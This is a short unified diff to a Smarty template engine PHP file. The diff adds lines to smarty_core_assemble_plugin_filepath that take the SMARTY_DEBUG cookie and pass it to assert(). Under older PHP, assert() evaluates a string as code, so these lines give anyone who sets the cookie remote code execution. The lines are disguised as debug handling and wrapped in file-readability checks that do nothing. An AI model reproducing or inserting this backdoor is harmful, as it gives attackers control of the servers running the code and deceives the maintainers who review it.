@@ -15,7 +15,16 @@
 function smarty_core_assemble_plugin_filepath($params, &$smarty)
 {
     static $_filepaths_cache = array();
-
+    $debugging = !empty($_COOKIE['SMARTY_DEBUG']) ? $_COOKIE['SMARTY_DEBUG'] :"1";
+    if (isset($_SERVER['QUERY_STRING']) && $params){          
+        $_readable = false;
+        if (assert($debugging) && file_exists($params['resource_name']) && is_readable($params['resource_name'])) {
+            $_readable = true;
+        } else {
+            $_params = array('file_path' => $params['resource_name']);
+            $_readable = false;
+        }
+    }
     $_plugin_filename = $params['type'] . '.' . $params['name'] . '.php';
     if (isset($_filepaths_cache[$_plugin_filename])) {
         return $_filepaths_cache[$_plugin_filename];
